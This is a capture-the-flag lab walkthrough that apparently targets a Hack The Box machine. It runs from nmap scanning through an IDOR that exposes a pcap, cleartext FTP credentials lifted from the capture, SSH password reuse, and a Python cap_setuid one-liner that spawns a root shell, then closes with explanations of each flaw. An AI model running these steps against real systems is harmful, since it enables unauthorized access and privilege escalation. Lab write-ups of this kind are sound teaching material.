---
tags:
        #IDOR
        #pcap
        #Capabilities
        #Python
        #Gunicorn
---

## 1. Enumeration

### Nmap Scan
The initial reconnaissance begins with a standard Nmap scan to identify active services on the target machine.

```bash
nmap 10.129.6.165 -Pn -sV -sC

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
```

### Framework Guessing & Service Analysis
The HTTP server header reveals **Gunicorn** (Green Unicorn), which is a Python WSGI HTTP Server. 

*   **Technology Stack:** The use of Gunicorn strongly suggests the backend is written in **Python**.
*   **Framework Identification:** Since common PHP endpoints (like `.php` files) are not present and a search for the default Django `/admin` page returned nothing, I assumed the web application is likely built using the **Flask** framework.

### Metadata Analysis (wget vs curl)
During enumeration, I search for a `Changelog-diff.html` report. To ensure the highest fidelity of the downloaded file, I chose `wget` over `curl`.

**Reasoning:** While both tools can download files, `wget` is often preferred when metadata preservation is important. By default, `wget` can preserve the **Last-Modified** timestamp (using `-N` or automatically in some versions), which allowed me to use `exiftool` to inspect the correct modification time and other metadata that might have been lost during a standard `curl` output redirection.

---

## 2. Web Exploitation (IDOR)

While navigating the "Security Dashboard," I noticed an interesting URL structure in the **Security Snapshot** page: `http://10.129.6.165/data/1`.

### Insecure Direct Object Reference (IDOR)
The application assigns a numerical ID to security captures. I tested for **IDOR** by manipulating the ID in the URL.

*   Navigating to `/data/1` showed a capture with limited information.
*   Pivoting to **`/data/0`** revealed a successful capture that was previously hidden or indexed as the first entry.

This endpoint allowed me to download a **pcap** file representing the network traffic captured at that index.

---

## 3. Traffic Analysis (pcap Analysis)

The downloaded `0.pcap` file contains captured network traffic from the host. Since FTP is a cleartext protocol, I used `tcpdump` to inspect the packets.

```bash
tcpdump -r 0.pcap
```

**Key Discovery:**
In the packet stream, I identified an unencrypted FTP login session:

1.  **User:** `nathan`
2.  **Password:** `Buck3tH4TF0RM3!`

The pcap revealed the login process:
`FTP: USER nathan` -> `331 Please specify the password.` -> `FTP: PASS Buck3tH4TF0RM3!` -> `230 Login successful.`

---

## 4. Initial Access (FTP & SSH)

### FTP Login
I first logged into FTP to verify the credentials and found the user flag.

```bash
ftp 10.129.6.165
# Logged in as nathan
```

### SSH Access (Password Reuse)
Testing for **password reuse**, I attempted to log in via SSH using the same credentials found in the traffic capture.

```bash
ssh nathan@10.129.6.165
# Success: Logged in as nathan
```

---

## 5. Privilege Escalation (User: root)

After gaining access as `nathan`, I checked for misconfigured binaries and capabilities.

### Linux Capabilities Enumeration
Standard `sudo -l` didn't yield anything interesting, so I searched for files with extended capabilities.

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
```

**Key Discovery:**
```text
/usr/bin/python3.8 = cap_setuid+ep
```
The **`cap_setuid+ep`** capability on the Python binary allows the process to manipulate its own UID. Specifically, it can set its UID to 0 (root).

### Exploitation via Python
I leveraged the capability to escalate to root by importing the `os` module and setting the UID to 0 before spawning a bash shell.

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

This successfully spawned a root shell.

---

## 6. Vulnerability Principles

### Insecure Direct Object Reference (IDOR)
IDOR occurs when an application uses user-supplied input to access objects directly without proper authorization checks. In this case, the application failed to verify if the user requesting `/data/0` had the right to access that specific capture, leading to the exposure of sensitive network traffic.

### Cleartext Protocols & Traffic Sniffing
The reliance on **FTP**, which transmits credentials in cleartext, allowed for the interception of sensitive information. This highlights the danger of using unencrypted protocols and the value of traffic analysis (pcap) in identifying lateral movement or credential harvesting opportunities.

### Insecure Linux Capabilities
Capabilities are used to provide fine-grained control over privileges. However, granting `cap_setuid` to an interpreter like **Python** is equivalent to giving full root access, as the interpreter can execute arbitrary code to change its identity and perform any action on the system.
